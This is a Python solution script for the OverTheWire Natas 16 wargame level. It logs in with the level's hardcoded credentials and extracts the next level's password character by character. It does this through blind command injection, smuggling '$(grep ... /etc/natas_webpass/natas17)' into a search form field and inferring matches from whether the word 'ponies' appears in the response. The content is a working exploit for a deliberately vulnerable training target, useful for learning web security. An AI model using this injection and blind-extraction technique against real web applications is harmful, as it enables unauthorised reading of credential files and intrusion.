import requests

# **Sheikh Uddin*********************************************
URL = "http://natas16.natas.labs.overthewire.org/"

auth_name = 'natas16'
auth_pass = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

s = requests.Session()
s.auth = (auth_name, auth_pass)
# ***********************************************

# List containing a-zA-Z0-9
alphabet = [chr(x) for x in range(ord('A'), ord('Z') + 1)]
alphabet += [chr(x) for x in range(ord('a'), ord('z') + 1)]
alphabet += [str(x) for x in range(0, 10)]

password = ""

# A lot of special characters are no longer allowed when "grep'ing" in
# the dictionary hosted on Natas16. It IS, however, possible to inject
# yet another grep command inside it, which we can redirect to
# /etc/natas_webpass/natas17, and grep one letter at a time
for x in range(0, 32):
    for letter in alphabet:
        inject_data = '^' + password + str(letter)
        injection = f"$(grep {inject_data} /etc/natas_webpass/natas17)ponies"
        DATA = {"needle": injection}

        # The request
        r = s.post(URL, data=DATA)

        if "ponies" not in r.content.decode():
            password += letter
            print(password)
    if len(password) == 32:
        print("Password retrieved successfully!")
        break;
